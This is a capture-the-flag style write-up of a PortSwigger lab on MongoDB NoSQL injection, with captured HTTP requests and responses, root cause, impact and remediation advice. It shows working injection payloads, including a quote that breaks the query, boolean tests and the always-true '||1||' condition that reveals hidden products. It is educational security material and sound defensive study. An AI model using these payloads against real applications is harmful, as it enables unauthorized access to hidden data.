# PortSwigger Lab: Detecting NoSQL injection

# TAGS: NoSQL Injection, MongoDB, Syntax Injection, Burp Suite, Repeater

Category: NoSQL Injection
Date: October 09, 2026
Day: Friday
Link: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection
Published: Ready
Status: Done

---

## Introduction

This new series of labs covers NoSQL injections. This technique follows the same idea as SQL injection, but it works with different methods according to NoSQL definitions.

NoSQL databases do not use the traditional relational (table-based) model of SQL databases. They store data in other formats — documents (as in MongoDB), key-value pairs, or graphs — and many of them build queries using JavaScript or a similar language. That is why injection here looks different from SQL injection, but the goal is the same: manipulating the query to change what it returns.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says that the category filter is powered by a MongoDB NoSQL database. The objective is to perform an injection attack that makes the application display unreleased products.

Unlike SQL, a MongoDB query can be built with JavaScript, so breaking out of the string and injecting JavaScript conditions can change what the query returns.

With Burp running, I opened the lab and clicked on a category filter. I captured the request:

```http
GET /filter?category=Accessories HTTP/2
Host: 0ac100ac04dc30e9818411f600fd00bd.web-security-academy.net
Cookie: session=QmNPhAGEMHeKj3MVEr9PXe4dICynGSiS
Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac100ac04dc30e9818411f600fd00bd.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

The `category` parameter goes straight into the query, so I sent it to Repeater to test it by hand.

---

## Exploitation:

#### Step 1: Break the query syntax

I submitted a single quote (`'`) in the `category` parameter. This caused a JavaScript syntax error, which is a strong sign that my input is being inserted into the query without being sanitized:

```http
GET /filter?category=Accessories' HTTP/2
Host: 0ac100ac04dc30e9818411f600fd00bd.web-security-academy.net
Cookie: session=QmNPhAGEMHeKj3MVEr9PXe4dICynGSiS
Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac100ac04dc30e9818411f600fd00bd.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5774

...
<h4>Internal Server Error</h4>
<p class=is-warning>Command failed with error 139 (JSInterpreterFailure): 'SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
' on server 127.0.0.1:27017. ...</p>
...
```

The error is very revealing: it comes from MongoDB (`on server 127.0.0.1:27017`) and says `JSInterpreterFailure` / `unterminated string literal`. This confirms that my input is being used inside a JavaScript expression that MongoDB evaluates, and that it is not sanitized.

#### Step 2: Confirm conditional behavior

Then I submitted a valid JavaScript expression, `Accessories'+'`, which did not cause an error. This showed that I was injecting into the query logic.

Next I tested boolean conditions to see if I could change the response:

- A false condition — `Accessories' && 0 && 'x` — returned no products.
- A true condition — `Accessories' && 1 && 'x` — returned the Accessories products.

This confirmed that my JavaScript conditions were being evaluated by the query.

#### Step 3: Override the condition to return unreleased products

Finally, I submitted a condition that always evaluates to true:

```http
GET /filter?category=Accessories'||1||' HTTP/2
Host: 0ac100ac04dc30e9818411f600fd00bd.web-security-academy.net
Cookie: session=QmNPhAGEMHeKj3MVEr9PXe4dICynGSiS
Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac100ac04dc30e9818411f600fd00bd.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

The response returned the unreleased products, so the query condition was fully overridden:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 11515

...
<h1>Accessories&apos;||1||&apos;</h1>
...
<section class="container-list-tiles">
    <div>
        <img src="/image/productcatalog/products/71.jpg">
        <h3>There&apos;s No Place Like Gnome</h3>
        $73.57
        <a class="button" href="/product?productId=1">View details</a>
    </div>
    ...
    <div>
        <img src="/image/productcatalog/products/52.jpg">
        <h3>Hydrated Crackers</h3>
        $14.98
        <a class="button" href="/product?productId=20">View details</a>
    </div>
</section>
...
```

The response listed all the products (IDs 1–20) instead of only the Accessories ones, including the unreleased products. This confirmed that the injected condition overrode the filter, so I opened the response in the browser and the lab was solved.

---

## Root Cause

The application builds the MongoDB query by concatenating the user-controlled `category` value directly into a JavaScript expression, without sanitizing it. Because the value is not escaped, I can close the string and inject JavaScript. `Accessories'||1||'` makes the condition always true, so the query returns products the filter was never supposed to show.

---

## Impact

An attacker can bypass filters and query conditions to retrieve data the application should not return — here, unreleased products, but in other cases user data, credentials, or hidden records. NoSQL injection can also be escalated to authentication bypass and to extracting data field by field.

---

## Remediation

To prevent this issue, applications should:

- Never build queries by concatenating user input; use parameterized queries or an ORM/driver that separates data from code;
- Validate and sanitize input, and cast parameters to the expected type (e.g. strings);
- Apply least privilege to the database account so injection cannot reach sensitive collections;
- Reject input containing query operators or JavaScript when it is not expected.

---

## Key Takeaways

1. A single quote that breaks the query is a quick way to detect NoSQL injection.
2. MongoDB queries built with JavaScript are vulnerable when user input is concatenated into them.
3. Boolean conditions (`&& 0`, `&& 1`) confirm the injection, and a forced-true condition (`'||1||'`) overrides the query.
4. The fix is the same principle as SQL injection: never mix data with code — use parameterized queries.

---

## References

- [PortSwigger — NoSQL injection](https://portswigger.net/web-security/nosql-injection)
- [PortSwigger — Detecting NoSQL injection (lab)](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)
- [PortSwigger — NoSQL syntax injection](https://portswigger.net/web-security/nosql-injection#nosql-syntax-injection)
- [OWASP — NoSQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
